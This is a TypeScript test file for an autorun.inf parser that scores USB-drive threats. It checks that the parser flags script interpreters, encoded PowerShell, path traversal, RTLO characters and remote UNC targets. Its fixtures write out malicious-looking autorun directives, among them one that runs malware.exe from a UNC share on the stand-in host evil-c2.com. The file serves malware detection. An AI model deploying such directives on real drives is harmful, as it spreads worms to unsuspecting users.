import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { AutorunParser } from '../../core/autorun-parser';

describe('AutorunParser (Phase M — Autorun.inf Safe Parsing & Threat Scoring)', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pp-autorun-test-'));
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // Cleanup best effort
    }
  });

  it('returns hasAutorun=false for non-existent file', async () => {
    const result = await AutorunParser.parseFile(path.join(tempDir, 'nonexistent.inf'));
    expect(result.hasAutorun).toBe(false);
    expect(result.isSuspicious).toBe(false);
    expect(result.riskScore).toBe(0);
  });

  it('rejects oversized autorun.inf exceeding 64 KB limit', async () => {
    const oversizedPath = path.join(tempDir, 'autorun.inf');
    const largeContent = '[autorun]\n' + 'open=test.exe\n'.repeat(5000);
    fs.writeFileSync(oversizedPath, largeContent, 'utf-8');

    const result = await AutorunParser.parseFile(oversizedPath);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.indicators).toContain('AUTORUN_OVERSIZED_OR_INVALID');
  });

  it('parses benign autorun.inf with label and icon only without flagging high threat', async () => {
    const benignPath = path.join(tempDir, 'autorun.inf');
    const content = `
[autorun]
label=Backup Drive
icon=drive.ico
UseAutoPlay=1
`;
    fs.writeFileSync(benignPath, content, 'utf-8');

    const result = await AutorunParser.parseFile(benignPath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.iconTarget).toBe('drive.ico');
    expect(result.openTarget).toBeUndefined();
    expect(result.isSuspicious).toBe(false);
    expect(result.riskScore).toBeLessThan(50);
  });

  it('detects and flags script interpreter in open directive (wscript.exe worm.vbs)', async () => {
    const maliciousPath = path.join(tempDir, 'autorun.inf');
    const content = `
[AutoRun]
open=wscript.exe //e:vbs worm.vbs
action=Open Flash Drive
icon=shell32.dll,4
`;
    fs.writeFileSync(maliciousPath, content, 'utf-8');

    const result = await AutorunParser.parseFile(maliciousPath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.riskScore).toBeGreaterThanOrEqual(85);
    expect(result.indicators).toContain('AUTORUN_SCRIPT_INTERPRETER');
  });

  it('detects executable binary open directive (open=installer.exe)', async () => {
    const exePath = path.join(tempDir, 'autorun.inf');
    const content = `
[autorun]
open=setup.exe
`;
    fs.writeFileSync(exePath, content, 'utf-8');

    const result = await AutorunParser.parseFile(exePath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.riskScore).toBeGreaterThanOrEqual(70);
    expect(result.indicators).toContain('AUTORUN_EXECUTABLE_DIRECTIVE');
  });

  it('detects deceptive shell command verbs and suspicious CLI flags (-enc)', async () => {
    const deceptivePath = path.join(tempDir, 'autorun.inf');
    const content = `
[autorun]
shell\\open\\command=powershell.exe -enc SQBFAFgA...
shell=open
`;
    fs.writeFileSync(deceptivePath, content, 'utf-8');

    const result = await AutorunParser.parseFile(deceptivePath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.riskScore).toBeGreaterThanOrEqual(85);
    expect(result.indicators).toContain('AUTORUN_SCRIPT_INTERPRETER');
    expect(result.indicators).toContain('AUTORUN_SUSPICIOUS_CLI_FLAGS');
  });

  it('detects parent directory traversal in autorun target (..\\..\\payload.exe)', async () => {
    const traversalPath = path.join(tempDir, 'autorun.inf');
    const content = `
[autorun]
open=..\\..\\Windows\\System32\\cmd.exe /c start
`;
    fs.writeFileSync(traversalPath, content, 'utf-8');

    const result = await AutorunParser.parseFile(traversalPath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.indicators).toContain('AUTORUN_TRAVERSAL_TARGET');
  });

  it('detects remote UNC path target in autorun directive (\\\\attacker\\share\\trojan.exe)', async () => {
    const uncPath = path.join(tempDir, 'autorun.inf');
    const content = `
[autorun]
open=\\\\evil-c2.com\\share\\malware.exe
`;
    fs.writeFileSync(uncPath, content, 'utf-8');

    const result = await AutorunParser.parseFile(uncPath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.indicators).toContain('AUTORUN_UNC_OR_DEVICE_TARGET');
  });

  it('strips RTLO/bidi unicode overrides and NUL bytes safely', async () => {
    const rtloContent = '[autorun]\r\nopen=test\u202Efdp.exe\x00';
    const sanitized = AutorunParser.sanitizeString(rtloContent);
    expect(sanitized.includes('\u202E')).toBe(false);
    expect(sanitized.includes('\0')).toBe(false);
  });

  it('correlates referenced on-disk executable through FileAnalyzer', async () => {
    const autorunPath = path.join(tempDir, 'autorun.inf');
    const payloadPath = path.join(tempDir, 'worm.bat');
    fs.writeFileSync(payloadPath, '@echo off\r\npowershell -enc JAB', 'utf-8');

    const content = `
[autorun]
open=worm.bat
`;
    fs.writeFileSync(autorunPath, content, 'utf-8');

    const result = await AutorunParser.parseFile(autorunPath, tempDir);
    expect(result.hasAutorun).toBe(true);
    expect(result.isSuspicious).toBe(true);
    expect(result.targetAnalysis).toBeDefined();
    expect(result.targetAnalysis?.filePath).toBe(payloadPath);
  });
});
